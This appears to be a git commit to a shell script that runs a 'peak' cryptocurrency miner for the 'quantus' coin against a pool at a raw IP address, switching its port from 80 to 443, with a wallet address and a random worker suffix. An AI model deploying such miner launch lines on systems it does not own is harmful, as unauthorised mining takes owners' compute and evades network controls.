f0478b531e22edca37eca8a8beb353dba36aa8f6
lukmanpurai-del <lukmanpurai@gmail.com>
2026-09-14 01:17:53 +0700

    Update quan.sh

--- quan.sh
+++ quan.sh
@@ -1,1 +1,1 @@
-./peak --coin quantus --url quic-insecure://23.94.152.126:80 --user qzkECXmFFPi2aK7c65jxFFwwvFTyNBNvcmXjsGmjyLBBsTU4K.$(shuf -n 1 -i 1-999999999)
+./peak --coin quantus --url quic-insecure://23.94.152.126:443 --user qzkECXmFFPi2aK7c65jxFFwwvFTyNBNvcmXjsGmjyLBBsTU4K.$(shuf -n 1 -i 1-999999999)
